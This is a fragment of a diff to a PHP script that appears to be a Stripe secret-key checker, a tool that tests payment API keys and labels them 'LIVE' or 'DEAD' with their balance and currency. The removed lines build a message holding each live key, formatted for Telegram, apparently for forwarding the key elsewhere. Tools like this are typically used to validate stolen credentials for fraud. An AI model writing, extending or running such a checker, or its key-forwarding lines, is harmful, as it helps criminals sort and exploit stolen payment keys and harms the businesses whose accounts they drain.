@@ -62,13 +62,6 @@ CURRENCY : $curr";
   <br>RESPONSE: VALID LIVE SK KEY✅
   <br>BALANCE: $balance
   <br>CURRENCY: $curr</b>";
-  $tg2 = 
-  "✅ SK LIVE
-#LIVE : <code>".$sk."</code>
-RESPONSE : VALID LIVE SK KEY ✅
-BALANCE : $balance
-CURRENCY : $curr";
-}      
 elseif(strpos($r1, "api_key_expired" )) {
   echo "<b>DEAD : $sk
   <br>RESPONSE: API KEY REVOKED ❌</b>";
@@ -86,12 +79,6 @@ elseif(strpos($r1, "Your card was declined" )) {
   <br>RESPONSE: VALID LIVE SK KEY✅
   <br>BALANCE: $balance
   <br>CURRENCY: $curr</b>";
-  $tg2 = 
-  "✅ SK LIVE
-#LIVE : <code>".$sk."</code>
-RESPONSE : VALID LIVE SK KEY ✅
-BALANCE : $balance
-CURRENCY : $curr";
 }
 else {
 echo "<b>DEAD: $sk
